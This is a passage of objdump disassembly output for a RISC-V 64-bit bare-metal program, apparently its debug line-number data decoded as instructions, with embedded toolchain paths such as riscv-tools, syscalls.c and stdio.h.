     6e6:	0301                	addi	t1,t1,0
     6e8:	0901                	addi	s2,s2,0
     6ea:	0002                	c.slli	zero,0x0
     6ec:	0301                	addi	t1,t1,0
     6ee:	0901                	addi	s2,s2,0
     6f0:	0002                	c.slli	zero,0x0
     6f2:	0301                	addi	t1,t1,0
     6f4:	0901                	addi	s2,s2,0
     6f6:	0002                	c.slli	zero,0x0
     6f8:	0301                	addi	t1,t1,0
     6fa:	0901                	addi	s2,s2,0
     6fc:	0002                	c.slli	zero,0x0
     6fe:	0301                	addi	t1,t1,0
     700:	0901                	addi	s2,s2,0
     702:	0002                	c.slli	zero,0x0
     704:	0301                	addi	t1,t1,0
     706:	0901                	addi	s2,s2,0
     708:	0002                	c.slli	zero,0x0
     70a:	0301                	addi	t1,t1,0
     70c:	0901                	addi	s2,s2,0
     70e:	0002                	c.slli	zero,0x0
     710:	0301                	addi	t1,t1,0
     712:	0901                	addi	s2,s2,0
     714:	0002                	c.slli	zero,0x0
     716:	0301                	addi	t1,t1,0
     718:	0901                	addi	s2,s2,0
     71a:	0002                	c.slli	zero,0x0
     71c:	0301                	addi	t1,t1,0
     71e:	0901                	addi	s2,s2,0
     720:	0002                	c.slli	zero,0x0
     722:	0301                	addi	t1,t1,0
     724:	0901                	addi	s2,s2,0
     726:	0002                	c.slli	zero,0x0
     728:	0301                	addi	t1,t1,0
     72a:	0901                	addi	s2,s2,0
     72c:	0002                	c.slli	zero,0x0
     72e:	0301                	addi	t1,t1,0
     730:	0901                	addi	s2,s2,0
     732:	0002                	c.slli	zero,0x0
     734:	0301                	addi	t1,t1,0
     736:	0901                	addi	s2,s2,0
     738:	0002                	c.slli	zero,0x0
     73a:	0301                	addi	t1,t1,0
     73c:	0901                	addi	s2,s2,0
     73e:	0002                	c.slli	zero,0x0
     740:	0301                	addi	t1,t1,0
     742:	0901                	addi	s2,s2,0
     744:	0002                	c.slli	zero,0x0
     746:	0301                	addi	t1,t1,0
     748:	0901                	addi	s2,s2,0
     74a:	0002                	c.slli	zero,0x0
     74c:	0301                	addi	t1,t1,0
     74e:	0901                	addi	s2,s2,0
     750:	0002                	c.slli	zero,0x0
     752:	0301                	addi	t1,t1,0
     754:	0901                	addi	s2,s2,0
     756:	0002                	c.slli	zero,0x0
     758:	0301                	addi	t1,t1,0
     75a:	0901                	addi	s2,s2,0
     75c:	0002                	c.slli	zero,0x0
     75e:	0301                	addi	t1,t1,0
     760:	0901                	addi	s2,s2,0
     762:	0002                	c.slli	zero,0x0
     764:	0301                	addi	t1,t1,0
     766:	0901                	addi	s2,s2,0
     768:	0002                	c.slli	zero,0x0
     76a:	0301                	addi	t1,t1,0
     76c:	0901                	addi	s2,s2,0
     76e:	0002                	c.slli	zero,0x0
     770:	0301                	addi	t1,t1,0
     772:	0901                	addi	s2,s2,0
     774:	0002                	c.slli	zero,0x0
     776:	0301                	addi	t1,t1,0
     778:	0901                	addi	s2,s2,0
     77a:	0002                	c.slli	zero,0x0
     77c:	0301                	addi	t1,t1,0
     77e:	0901                	addi	s2,s2,0
     780:	0002                	c.slli	zero,0x0
     782:	0301                	addi	t1,t1,0
     784:	0901                	addi	s2,s2,0
     786:	0002                	c.slli	zero,0x0
     788:	0301                	addi	t1,t1,0
     78a:	0901                	addi	s2,s2,0
     78c:	0002                	c.slli	zero,0x0
     78e:	0301                	addi	t1,t1,0
     790:	0902                	slli	s2,s2,0x0
     792:	0002                	c.slli	zero,0x0
     794:	0301                	addi	t1,t1,0
     796:	0901                	addi	s2,s2,0
     798:	0002                	c.slli	zero,0x0
     79a:	0901                	addi	s2,s2,0
     79c:	0004                	0x4
     79e:	0100                	addi	s0,sp,128
     7a0:	8801                	andi	s0,s0,0
     7a2:	0000                	unimp
     7a4:	0200                	addi	s0,sp,256
     7a6:	2200                	fld	fs0,0(a2)
     7a8:	0000                	unimp
     7aa:	0100                	addi	s0,sp,128
     7ac:	fb01                	bnez	a4,6bc <_tbss_end+0x638>
     7ae:	0d0e                	slli	s10,s10,0x3
     7b0:	0100                	addi	s0,sp,128
     7b2:	0101                	addi	sp,sp,0
     7b4:	0001                	nop
     7b6:	0000                	unimp
     7b8:	0001                	nop
     7ba:	0100                	addi	s0,sp,128
     7bc:	00637273          	csrrci	tp,0x6,6
     7c0:	7300                	ld	s0,32(a4)
     7c2:	6174                	ld	a3,192(a0)
     7c4:	532e6b63          	bltu	t3,s2,cfa <_tbss_end+0xc76>
     7c8:	0100                	addi	s0,sp,128
     7ca:	0000                	unimp
     7cc:	0000                	unimp
     7ce:	0209                	addi	tp,tp,2
     7d0:	14dc                	addi	a5,sp,612
     7d2:	8000                	0x8000
     7d4:	0000                	unimp
     7d6:	0000                	unimp
     7d8:	09010317          	auipc	t1,0x9010
     7dc:	0002                	c.slli	zero,0x0
     7de:	0301                	addi	t1,t1,0
     7e0:	0904                	addi	s1,sp,144
     7e2:	0002                	c.slli	zero,0x0
     7e4:	0301                	addi	t1,t1,0
     7e6:	0901                	addi	s2,s2,0
     7e8:	0002                	c.slli	zero,0x0
     7ea:	0301                	addi	t1,t1,0
     7ec:	0901                	addi	s2,s2,0
     7ee:	0004                	0x4
     7f0:	0301                	addi	t1,t1,0
     7f2:	0901                	addi	s2,s2,0
     7f4:	0004                	0x4
     7f6:	0301                	addi	t1,t1,0
     7f8:	0901                	addi	s2,s2,0
     7fa:	0004                	0x4
     7fc:	0301                	addi	t1,t1,0
     7fe:	0901                	addi	s2,s2,0
     800:	0004                	0x4
     802:	0301                	addi	t1,t1,0
     804:	0901                	addi	s2,s2,0
     806:	0004                	0x4
     808:	0301                	addi	t1,t1,0
     80a:	0901                	addi	s2,s2,0
     80c:	0004                	0x4
     80e:	0301                	addi	t1,t1,0
     810:	0901                	addi	s2,s2,0
     812:	0004                	0x4
     814:	0301                	addi	t1,t1,0
     816:	0901                	addi	s2,s2,0
     818:	0004                	0x4
     81a:	0301                	addi	t1,t1,0
     81c:	0901                	addi	s2,s2,0
     81e:	0004                	0x4
     820:	0301                	addi	t1,t1,0
     822:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     826:	0901                	addi	s2,s2,0
     828:	0002                	c.slli	zero,0x0
     82a:	0100                	addi	s0,sp,128
     82c:	7101                	addi	sp,sp,-512
     82e:	0011                	c.nop	4
     830:	0300                	addi	s0,sp,384
     832:	f600                	sd	s0,40(a2)
     834:	0001                	nop
     836:	0100                	addi	s0,sp,128
     838:	fb01                	bnez	a4,748 <_tbss_end+0x6c4>
     83a:	0d0e                	slli	s10,s10,0x3
     83c:	0100                	addi	s0,sp,128
     83e:	0101                	addi	sp,sp,0
     840:	0001                	nop
     842:	0000                	unimp
     844:	0001                	nop
     846:	0100                	addi	s0,sp,128
     848:	6e69                	lui	t3,0x1a
     84a:	72730063          	beq	t1,t2,f6a <_tbss_end+0xee6>
     84e:	682f0063          	beq	t5,sp,ece <_tbss_end+0xe4a>
     852:	2f656d6f          	jal	s10,56b48 <_tbss_end+0x56ac4>
     856:	6e656863          	bltu	a0,t1,f46 <_tbss_end+0xec2>
     85a:	61697867          	0x61697867
     85e:	2f75796f          	jal	s2,58354 <_tbss_end+0x582d0>
     862:	70696863          	bltu	s2,t1,f72 <_tbss_end+0xeee>
     866:	6179                	addi	sp,sp,464
     868:	6472                	ld	s0,280(sp)
     86a:	6f632e2f          	0x6f632e2f
     86e:	646e                	ld	s0,216(sp)
     870:	2d61                	addiw	s10,s10,24
     872:	6e65                	lui	t3,0x19
     874:	2f76                	fld	ft10,344(sp)
     876:	6972                	ld	s2,280(sp)
     878:	2d766373          	csrrsi	t1,0x2d7,12
     87c:	6f74                	ld	a3,216(a4)
     87e:	2f736c6f          	jal	s8,37374 <_tbss_end+0x372f0>
     882:	6972                	ld	s2,280(sp)
     884:	36766373          	csrrsi	t1,0x367,12
     888:	2d34                	fld	fa3,88(a0)
     88a:	6e75                	lui	t3,0x1d
     88c:	776f6e6b          	0x776f6e6b
     890:	2d6e                	fld	fs10,216(sp)
     892:	6c65                	lui	s8,0x19
     894:	2f66                	fld	ft10,88(sp)
     896:	6e69                	lui	t3,0x1a
     898:	64756c63          	bltu	a0,t2,ef0 <_tbss_end+0xe6c>
     89c:	0065                	c.nop	25
     89e:	6d6f682f          	0x6d6f682f
     8a2:	2f65                	addiw	t5,t5,25
     8a4:	6e656863          	bltu	a0,t1,f94 <_tbss_end+0xf10>
     8a8:	61697867          	0x61697867
     8ac:	2f75796f          	jal	s2,583a2 <_tbss_end+0x5831e>
     8b0:	70696863          	bltu	s2,t1,fc0 <_tbss_end+0xf3c>
     8b4:	6179                	addi	sp,sp,464
     8b6:	6472                	ld	s0,280(sp)
     8b8:	6f632e2f          	0x6f632e2f
     8bc:	646e                	ld	s0,216(sp)
     8be:	2d61                	addiw	s10,s10,24
     8c0:	6e65                	lui	t3,0x19
     8c2:	2f76                	fld	ft10,344(sp)
     8c4:	6972                	ld	s2,280(sp)
     8c6:	2d766373          	csrrsi	t1,0x2d7,12
     8ca:	6f74                	ld	a3,216(a4)
     8cc:	2f736c6f          	jal	s8,373c2 <_tbss_end+0x3733e>
     8d0:	6972                	ld	s2,280(sp)
     8d2:	36766373          	csrrsi	t1,0x367,12
     8d6:	2d34                	fld	fa3,88(a0)
     8d8:	6e75                	lui	t3,0x1d
     8da:	776f6e6b          	0x776f6e6b
     8de:	2d6e                	fld	fs10,216(sp)
     8e0:	6c65                	lui	s8,0x19
     8e2:	2f66                	fld	ft10,88(sp)
     8e4:	6e69                	lui	t3,0x1a
     8e6:	64756c63          	bltu	a0,t2,f3e <_tbss_end+0xeba>
     8ea:	2f65                	addiw	t5,t5,25
     8ec:	616d                	addi	sp,sp,240
     8ee:	6e696863          	bltu	s2,t1,fde <_tbss_end+0xf5a>
     8f2:	0065                	c.nop	25
     8f4:	6d6f682f          	0x6d6f682f
     8f8:	2f65                	addiw	t5,t5,25
     8fa:	6e656863          	bltu	a0,t1,fea <_tbss_end+0xf66>
     8fe:	61697867          	0x61697867
     902:	2f75796f          	jal	s2,583f8 <_tbss_end+0x58374>
     906:	70696863          	bltu	s2,t1,1016 <_tbss_end+0xf92>
     90a:	6179                	addi	sp,sp,464
     90c:	6472                	ld	s0,280(sp)
     90e:	6f632e2f          	0x6f632e2f
     912:	646e                	ld	s0,216(sp)
     914:	2d61                	addiw	s10,s10,24
     916:	6e65                	lui	t3,0x19
     918:	2f76                	fld	ft10,344(sp)
     91a:	6972                	ld	s2,280(sp)
     91c:	2d766373          	csrrsi	t1,0x2d7,12
     920:	6f74                	ld	a3,216(a4)
     922:	2f736c6f          	jal	s8,37418 <_tbss_end+0x37394>
     926:	6972                	ld	s2,280(sp)
     928:	36766373          	csrrsi	t1,0x367,12
     92c:	2d34                	fld	fa3,88(a0)
     92e:	6e75                	lui	t3,0x1d
     930:	776f6e6b          	0x776f6e6b
     934:	2d6e                	fld	fs10,216(sp)
     936:	6c65                	lui	s8,0x19
     938:	2f66                	fld	ft10,88(sp)
     93a:	6e69                	lui	t3,0x1a
     93c:	64756c63          	bltu	a0,t2,f94 <_tbss_end+0xf10>
     940:	2f65                	addiw	t5,t5,25
     942:	00737973          	csrrci	s2,0x7,6
     946:	6d6f682f          	0x6d6f682f
     94a:	2f65                	addiw	t5,t5,25
     94c:	6e656863          	bltu	a0,t1,103c <_tbss_end+0xfb8>
     950:	61697867          	0x61697867
     954:	2f75796f          	jal	s2,5844a <_tbss_end+0x583c6>
     958:	70696863          	bltu	s2,t1,1068 <_tbss_end+0xfe4>
     95c:	6179                	addi	sp,sp,464
     95e:	6472                	ld	s0,280(sp)
     960:	6f632e2f          	0x6f632e2f
     964:	646e                	ld	s0,216(sp)
     966:	2d61                	addiw	s10,s10,24
     968:	6e65                	lui	t3,0x19
     96a:	2f76                	fld	ft10,344(sp)
     96c:	6972                	ld	s2,280(sp)
     96e:	2d766373          	csrrsi	t1,0x2d7,12
     972:	6f74                	ld	a3,216(a4)
     974:	2f736c6f          	jal	s8,3746a <_tbss_end+0x373e6>
     978:	696c                	ld	a1,208(a0)
     97a:	2f62                	fld	ft10,24(sp)
     97c:	2f636367          	0x2f636367
     980:	6972                	ld	s2,280(sp)
     982:	36766373          	csrrsi	t1,0x367,12
     986:	2d34                	fld	fa3,88(a0)
     988:	6e75                	lui	t3,0x1d
     98a:	776f6e6b          	0x776f6e6b
     98e:	2d6e                	fld	fs10,216(sp)
     990:	6c65                	lui	s8,0x19
     992:	2f66                	fld	ft10,88(sp)
     994:	2e39                	addiw	t3,t3,14
     996:	2e32                	fld	ft8,264(sp)
     998:	2f30                	fld	fa2,88(a4)
     99a:	6e69                	lui	t3,0x1a
     99c:	64756c63          	bltu	a0,t2,ff4 <_tbss_end+0xf70>
     9a0:	0065                	c.nop	25
     9a2:	7500                	ld	s0,40(a0)
     9a4:	6974                	ld	a3,208(a0)
     9a6:	2e6c                	fld	fa1,216(a2)
     9a8:	0068                	addi	a0,sp,12
     9aa:	0001                	nop
     9ac:	7300                	ld	s0,32(a4)
     9ae:	7379                	lui	t1,0xffffe
     9b0:	6c6c6163          	bltu	s8,t1,1072 <_tbss_end+0xfee>
     9b4:	00632e73          	csrrs	t3,0x6,t1
     9b8:	0002                	c.slli	zero,0x0
     9ba:	7300                	ld	s0,32(a4)
     9bc:	6474                	ld	a3,200(s0)
     9be:	6f69                	lui	t5,0x1a
     9c0:	682e                	ld	a6,200(sp)
     9c2:	0300                	addi	s0,sp,384
     9c4:	0000                	unimp
     9c6:	645f 6665 7561      	0x75616665645f
     9cc:	746c                	ld	a1,232(s0)
     9ce:	745f 7079 7365      	0x73657079745f
     9d4:	682e                	ld	a6,200(sp)
     9d6:	0400                	addi	s0,sp,512
     9d8:	0000                	unimp
     9da:	735f 6474 6e69      	0x6e696474735f
     9e0:	2e74                	fld	fa3,216(a2)
     9e2:	0068                	addi	a0,sp,12
     9e4:	0005                	c.nop	1
     9e6:	7300                	ld	s0,32(a4)
     9e8:	6474                	ld	a3,200(s0)
     9ea:	6564                	ld	s1,200(a0)
     9ec:	2e66                	fld	ft8,88(sp)
     9ee:	0068                	addi	a0,sp,12
     9f0:	0006                	c.slli	zero,0x1
     9f2:	5f00                	lw	s0,56(a4)
     9f4:	7974                	ld	a3,240(a0)
     9f6:	6570                	ld	a2,200(a0)
     9f8:	00682e73          	csrrs	t3,0x6,a6
     9fc:	0005                	c.nop	1
     9fe:	7200                	ld	s0,32(a2)
     a00:	6565                	lui	a0,0x19
     a02:	746e                	ld	s0,248(sp)
     a04:	682e                	ld	a6,200(sp)
     a06:	0500                	addi	s0,sp,640
     a08:	0000                	unimp
     a0a:	6f6c                	ld	a1,216(a4)
     a0c:	682e6b63          	bltu	t3,sp,10a2 <_tbss_end+0x101e>
     a10:	0500                	addi	s0,sp,640
     a12:	0000                	unimp
     a14:	61647473          	csrrci	s0,0x616,8
     a18:	6772                	ld	a4,280(sp)
     a1a:	682e                	ld	a6,200(sp)
     a1c:	0600                	addi	s0,sp,768
     a1e:	0000                	unimp
     a20:	69727473          	csrrci	s0,0x697,4
     a24:	676e                	ld	a4,216(sp)
     a26:	682e                	ld	a6,200(sp)
     a28:	0300                	addi	s0,sp,384
     a2a:	0000                	unimp
     a2c:	0500                	addi	s0,sp,640
     a2e:	0001                	nop
     a30:	0209                	addi	tp,tp,2
     a32:	150a                	slli	a0,a0,0x22
     a34:	8000                	0x8000
     a36:	0000                	unimp
     a38:	0000                	unimp
     a3a:	03012803          	lw	a6,48(sp)
     a3e:	0908                	addi	a0,sp,144
     a40:	0014                	0x14
     a42:	0301                	addi	t1,t1,0
     a44:	00080903          	lb	s2,0(a6)
     a48:	0301                	addi	t1,t1,0
     a4a:	0908                	addi	a0,sp,144
     a4c:	0014                	0x14
     a4e:	0301                	addi	t1,t1,0
     a50:	00080903          	lb	s2,0(a6)
     a54:	0501                	addi	a0,a0,0
     a56:	030a                	slli	t1,t1,0x2
     a58:	00140903          	lb	s2,1(s0)
     a5c:	0501                	addi	a0,a0,0
     a5e:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     a62:	0004                	0x4
     a64:	0501                	addi	a0,a0,0
     a66:	0312                	slli	t1,t1,0x4
     a68:	0902                	slli	s2,s2,0x0
     a6a:	0002                	c.slli	zero,0x0
     a6c:	0501                	addi	a0,a0,0
     a6e:	0309                	addi	t1,t1,2
     a70:	0900                	addi	s0,sp,144
     a72:	000c                	0xc
     a74:	0501                	addi	a0,a0,0
     a76:	0320                	addi	s0,sp,392
     a78:	0900                	addi	s0,sp,144
     a7a:	0006                	c.slli	zero,0x1
     a7c:	0501                	addi	a0,a0,0
     a7e:	09000317          	auipc	t1,0x9000
     a82:	000e                	c.slli	zero,0x3
     a84:	0501                	addi	a0,a0,0
     a86:	0314                	addi	a3,sp,384
     a88:	0901                	addi	s2,s2,0
     a8a:	0006                	c.slli	zero,0x1
     a8c:	0501                	addi	a0,a0,0
     a8e:	0309                	addi	t1,t1,2
     a90:	0900                	addi	s0,sp,144
     a92:	000c                	0xc
     a94:	0501                	addi	a0,a0,0
     a96:	0324                	addi	s1,sp,392
     a98:	0900                	addi	s0,sp,144
     a9a:	0006                	c.slli	zero,0x1
     a9c:	0501                	addi	a0,a0,0
     a9e:	0319                	addi	t1,t1,6
     aa0:	0900                	addi	s0,sp,144
     aa2:	000e                	c.slli	zero,0x3
     aa4:	0501                	addi	a0,a0,0
     aa6:	0308                	addi	a0,sp,384
     aa8:	0901                	addi	s2,s2,0
     aaa:	0006                	c.slli	zero,0x1
     aac:	0501                	addi	a0,a0,0
     aae:	0402001b          	addiw	zero,tp,64
     ab2:	0301                	addi	t1,t1,0
     ab4:	0900                	addi	s0,sp,144
     ab6:	0010                	0x10
     ab8:	0501                	addi	a0,a0,0
     aba:	0308                	addi	a0,sp,384
     abc:	0901                	addi	s2,s2,0
     abe:	000a                	c.slli	zero,0x2
     ac0:	0501                	addi	a0,a0,0
     ac2:	0402001b          	addiw	zero,tp,64
     ac6:	0301                	addi	t1,t1,0
     ac8:	0900                	addi	s0,sp,144
     aca:	0010                	0x10
     acc:	0001                	nop
     ace:	0402                	slli	s0,s0,0x0
     ad0:	0302                	slli	t1,t1,0x0
     ad2:	000a097b          	0xa097b
     ad6:	0501                	addi	a0,a0,0
     ad8:	0014                	0x14
     ada:	0402                	slli	s0,s0,0x0
     adc:	0301                	addi	t1,t1,0
     ade:	0900                	addi	s0,sp,144
     ae0:	000a                	c.slli	zero,0x2
     ae2:	0501                	addi	a0,a0,0
     ae4:	0016                	c.slli	zero,0x5
     ae6:	0402                	slli	s0,s0,0x0
     ae8:	0301                	addi	t1,t1,0
     aea:	0900                	addi	s0,sp,144
     aec:	0010                	0x10
     aee:	0501                	addi	a0,a0,0
     af0:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     af4:	0301                	addi	t1,t1,0
     af6:	0900                	addi	s0,sp,144
     af8:	0008                	0x8
     afa:	0501                	addi	a0,a0,0
     afc:	030d                	addi	t1,t1,3
     afe:	000a0907          	0xa0907
     b02:	0501                	addi	a0,a0,0
     b04:	0306                	slli	t1,t1,0x1
     b06:	0900                	addi	s0,sp,144
     b08:	0008                	0x8
     b0a:	0501                	addi	a0,a0,0
     b0c:	0019                	c.nop	6
     b0e:	0402                	slli	s0,s0,0x0
     b10:	0301                	addi	t1,t1,0
     b12:	0900                	addi	s0,sp,144
     b14:	0002                	c.slli	zero,0x0
     b16:	0501                	addi	a0,a0,0
     b18:	0028                	addi	a0,sp,8
     b1a:	0402                	slli	s0,s0,0x0
     b1c:	0301                	addi	t1,t1,0
     b1e:	0900                	addi	s0,sp,144
     b20:	0014                	0x14
     b22:	0501                	addi	a0,a0,0
     b24:	001f 0402 0301      	0x3010402001f
     b2a:	0900                	addi	s0,sp,144
     b2c:	000e                	c.slli	zero,0x3
     b2e:	0501                	addi	a0,a0,0
     b30:	0012                	c.slli	zero,0x4
     b32:	0402                	slli	s0,s0,0x0
     b34:	0301                	addi	t1,t1,0
     b36:	0900                	addi	s0,sp,144
     b38:	0002                	c.slli	zero,0x0
     b3a:	0501                	addi	a0,a0,0
     b3c:	030c                	addi	a1,sp,384
     b3e:	0901                	addi	s2,s2,0
     b40:	0006                	c.slli	zero,0x1
     b42:	0501                	addi	a0,a0,0
     b44:	030a                	slli	t1,t1,0x2
     b46:	0901                	addi	s2,s2,0
     b48:	0006                	c.slli	zero,0x1
     b4a:	0501                	addi	a0,a0,0
     b4c:	0301                	addi	t1,t1,0
     b4e:	0901                	addi	s2,s2,0
     b50:	0002                	c.slli	zero,0x0
     b52:	0301                	addi	t1,t1,0
     b54:	00080903          	lb	s2,0(a6)
     b58:	0501                	addi	a0,a0,0
     b5a:	030a                	slli	t1,t1,0x2
     b5c:	00140903          	lb	s2,1(s0)
     b60:	0501                	addi	a0,a0,0
     b62:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     b66:	0004                	0x4
     b68:	0501                	addi	a0,a0,0
     b6a:	0315                	addi	t1,t1,5
     b6c:	0902                	slli	s2,s2,0x0
     b6e:	0002                	c.slli	zero,0x0
     b70:	0501                	addi	a0,a0,0
     b72:	030c                	addi	a1,sp,384
     b74:	0900                	addi	s0,sp,144
     b76:	000c                	0xc
     b78:	0501                	addi	a0,a0,0
     b7a:	09000323          	sb	a6,134(zero) # 86 <_tbss_end+0x2>
     b7e:	0006                	c.slli	zero,0x1
     b80:	0501                	addi	a0,a0,0
     b82:	031a                	slli	t1,t1,0x6
     b84:	0900                	addi	s0,sp,144
     b86:	000e                	c.slli	zero,0x3
     b88:	0501                	addi	a0,a0,0
     b8a:	09010317          	auipc	t1,0x9010
     b8e:	0006                	c.slli	zero,0x1
     b90:	0501                	addi	a0,a0,0
     b92:	030c                	addi	a1,sp,384
     b94:	0900                	addi	s0,sp,144
     b96:	000c                	0xc
     b98:	0501                	addi	a0,a0,0
     b9a:	09000327          	0x9000327
     b9e:	0006                	c.slli	zero,0x1
     ba0:	0501                	addi	a0,a0,0
     ba2:	031c                	addi	a5,sp,384
     ba4:	0900                	addi	s0,sp,144
     ba6:	000e                	c.slli	zero,0x3
     ba8:	0501                	addi	a0,a0,0
     baa:	0312                	slli	t1,t1,0x4
     bac:	0901                	addi	s2,s2,0
     bae:	0006                	c.slli	zero,0x1
     bb0:	0501                	addi	a0,a0,0
     bb2:	0309                	addi	t1,t1,2
     bb4:	0900                	addi	s0,sp,144
     bb6:	0014                	0x14
     bb8:	0501                	addi	a0,a0,0
     bba:	0322                	slli	t1,t1,0x8
     bbc:	0900                	addi	s0,sp,144
     bbe:	0004                	0x4
     bc0:	0501                	addi	a0,a0,0
     bc2:	0319                	addi	t1,t1,6
     bc4:	0900                	addi	s0,sp,144
     bc6:	0014                	0x14
     bc8:	0501                	addi	a0,a0,0
     bca:	0901030f          	0x901030f
     bce:	0004                	0x4
     bd0:	0501                	addi	a0,a0,0
     bd2:	0308                	addi	a0,sp,384
     bd4:	0900                	addi	s0,sp,144
     bd6:	000c                	0xc
     bd8:	0501                	addi	a0,a0,0
     bda:	001f 0402 0301      	0x3010402001f
     be0:	0900                	addi	s0,sp,144
     be2:	0002                	c.slli	zero,0x0
     be4:	0501                	addi	a0,a0,0
     be6:	0021                	c.nop	8
     be8:	0402                	slli	s0,s0,0x0
     bea:	0301                	addi	t1,t1,0
     bec:	0900                	addi	s0,sp,144
     bee:	0008                	0x8
     bf0:	0501                	addi	a0,a0,0
     bf2:	0402001b          	addiw	zero,tp,64
     bf6:	0302                	slli	t1,t1,0x0
     bf8:	000a097b          	0xa097b
     bfc:	0501                	addi	a0,a0,0
     bfe:	0014                	0x14
     c00:	0402                	slli	s0,s0,0x0
     c02:	0301                	addi	t1,t1,0
     c04:	0900                	addi	s0,sp,144
     c06:	000a                	c.slli	zero,0x2
     c08:	0501                	addi	a0,a0,0
     c0a:	0016                	c.slli	zero,0x5
     c0c:	0402                	slli	s0,s0,0x0
     c0e:	0301                	addi	t1,t1,0
     c10:	0900                	addi	s0,sp,144
     c12:	0010                	0x10
     c14:	0501                	addi	a0,a0,0
     c16:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     c1a:	0301                	addi	t1,t1,0
     c1c:	0900                	addi	s0,sp,144
     c1e:	0008                	0x8
     c20:	0501                	addi	a0,a0,0
     c22:	030d                	addi	t1,t1,3
     c24:	000a0907          	0xa0907
     c28:	0501                	addi	a0,a0,0
     c2a:	0306                	slli	t1,t1,0x1
     c2c:	0900                	addi	s0,sp,144
     c2e:	0008                	0x8
     c30:	0501                	addi	a0,a0,0
     c32:	0019                	c.nop	6
     c34:	0402                	slli	s0,s0,0x0
     c36:	0301                	addi	t1,t1,0
     c38:	0900                	addi	s0,sp,144
     c3a:	0002                	c.slli	zero,0x0
     c3c:	0501                	addi	a0,a0,0
     c3e:	0028                	addi	a0,sp,8
     c40:	0402                	slli	s0,s0,0x0
     c42:	0301                	addi	t1,t1,0
     c44:	0900                	addi	s0,sp,144
     c46:	0010                	0x10
     c48:	0501                	addi	a0,a0,0
     c4a:	0012                	c.slli	zero,0x4
     c4c:	0402                	slli	s0,s0,0x0
     c4e:	0301                	addi	t1,t1,0
     c50:	0900                	addi	s0,sp,144
     c52:	0010                	0x10
     c54:	0501                	addi	a0,a0,0
     c56:	030c                	addi	a1,sp,384
     c58:	0901                	addi	s2,s2,0
     c5a:	0006                	c.slli	zero,0x1
     c5c:	0501                	addi	a0,a0,0
     c5e:	030a                	slli	t1,t1,0x2
     c60:	0901                	addi	s2,s2,0
     c62:	0006                	c.slli	zero,0x1
     c64:	0501                	addi	a0,a0,0
     c66:	0301                	addi	t1,t1,0
     c68:	0901                	addi	s2,s2,0
     c6a:	0002                	c.slli	zero,0x0
     c6c:	0301                	addi	t1,t1,0
     c6e:	00080903          	lb	s2,0(a6)
     c72:	0501                	addi	a0,a0,0
     c74:	09050303          	lb	t1,144(a0) # 19090 <_tbss_end+0x1900c>
     c78:	000c                	0xc
     c7a:	0501                	addi	a0,a0,0
     c7c:	0311                	addi	t1,t1,4
     c7e:	0902                	slli	s2,s2,0x0
     c80:	0004                	0x4
     c82:	0501                	addi	a0,a0,0
     c84:	0900030f          	0x900030f
     c88:	0010                	0x10
     c8a:	0501                	addi	a0,a0,0
     c8c:	09010307          	0x9010307
     c90:	0004                	0x4
     c92:	0501                	addi	a0,a0,0
     c94:	0330                	addi	a2,sp,392
     c96:	0900                	addi	s0,sp,144
     c98:	001a                	c.slli	zero,0x6
     c9a:	0501                	addi	a0,a0,0
     c9c:	0306                	slli	t1,t1,0x1
     c9e:	0900                	addi	s0,sp,144
     ca0:	0008                	0x8
     ca2:	0501                	addi	a0,a0,0
     ca4:	0902030b          	0x902030b
     ca8:	0004                	0x4
     caa:	0301                	addi	t1,t1,0
     cac:	0901                	addi	s2,s2,0
     cae:	000c                	0xc
     cb0:	0501                	addi	a0,a0,0
     cb2:	030d                	addi	t1,t1,3
     cb4:	0902                	slli	s2,s2,0x0
     cb6:	0010                	0x10
     cb8:	0501                	addi	a0,a0,0
     cba:	0014                	0x14
     cbc:	0402                	slli	s0,s0,0x0
     cbe:	0301                	addi	t1,t1,0
     cc0:	0900                	addi	s0,sp,144
     cc2:	0002                	c.slli	zero,0x0
     cc4:	0501                	addi	a0,a0,0
     cc6:	000d                	c.nop	3
     cc8:	0402                	slli	s0,s0,0x0
     cca:	0301                	addi	t1,t1,0
     ccc:	0900                	addi	s0,sp,144
     cce:	0012                	c.slli	zero,0x4
     cd0:	0501                	addi	a0,a0,0
     cd2:	09030303          	lb	t1,144(t1) # 9010c1a <_tbss_end+0x9010b96>
     cd6:	0004                	0x4
     cd8:	0501                	addi	a0,a0,0
     cda:	0301                	addi	t1,t1,0
     cdc:	0901                	addi	s2,s2,0
     cde:	0004                	0x4
     ce0:	0301                	addi	t1,t1,0
     ce2:	00080903          	lb	s2,0(a6)
     ce6:	0501                	addi	a0,a0,0
     ce8:	031a                	slli	t1,t1,0x6
     cea:	0901                	addi	s2,s2,0
     cec:	000a                	c.slli	zero,0x2
     cee:	0501                	addi	a0,a0,0
     cf0:	0315                	addi	t1,t1,5
     cf2:	0900                	addi	s0,sp,144
     cf4:	0008                	0x8
     cf6:	0501                	addi	a0,a0,0
     cf8:	030c                	addi	a1,sp,384
     cfa:	0900                	addi	s0,sp,144
     cfc:	0006                	c.slli	zero,0x1
     cfe:	0501                	addi	a0,a0,0
     d00:	030d                	addi	t1,t1,3
     d02:	0901                	addi	s2,s2,0
     d04:	0006                	c.slli	zero,0x1
     d06:	0501                	addi	a0,a0,0
     d08:	031a                	slli	t1,t1,0x6
     d0a:	0900                	addi	s0,sp,144
     d0c:	0008                	0x8
     d0e:	0501                	addi	a0,a0,0
     d10:	09000313          	li	t1,144
     d14:	0006                	c.slli	zero,0x1
     d16:	0501                	addi	a0,a0,0
     d18:	0301                	addi	t1,t1,0
     d1a:	0901                	addi	s2,s2,0
     d1c:	0002                	c.slli	zero,0x0
     d1e:	0401                	addi	s0,s0,0
     d20:	0302                	slli	t1,t1,0x0
     d22:	7f9d                	lui	t6,0xfffe7
     d24:	0809                	addi	a6,a6,2
     d26:	0100                	addi	s0,sp,128
     d28:	1005                	c.nop	-31
     d2a:	2e090203          	lb	tp,736(s2)
     d2e:	0100                	addi	s0,sp,128
     d30:	06090103          	lb	sp,96(s2)
     d34:	0100                	addi	s0,sp,128
     d36:	06090103          	lb	sp,96(s2)
     d3a:	0100                	addi	s0,sp,128
     d3c:	06090103          	lb	sp,96(s2)
     d40:	0100                	addi	s0,sp,128
     d42:	0305                	addi	t1,t1,1
     d44:	06090103          	lb	sp,96(s2)
     d48:	0100                	addi	s0,sp,128
     d4a:	0c05                	addi	s8,s8,1
     d4c:	04090203          	lb	tp,64(s2)
